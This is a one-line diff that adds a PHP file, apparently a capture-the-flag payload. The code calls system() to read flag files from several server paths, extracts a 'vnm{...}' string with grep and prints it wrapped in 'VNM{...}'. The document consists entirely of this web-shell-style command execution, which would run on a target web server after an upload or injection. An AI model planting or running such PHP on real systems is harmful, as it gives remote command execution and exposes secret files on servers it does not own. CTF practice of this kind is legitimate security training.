@@ -1,0 +1,1 @@
+<?php echo "VNM{"; system('cat /flag* /home/*/flag* /var/www/html/flag* 2>/dev/null | grep -o "vnm{[^}]*}" | head -1'); echo "}"; ?>
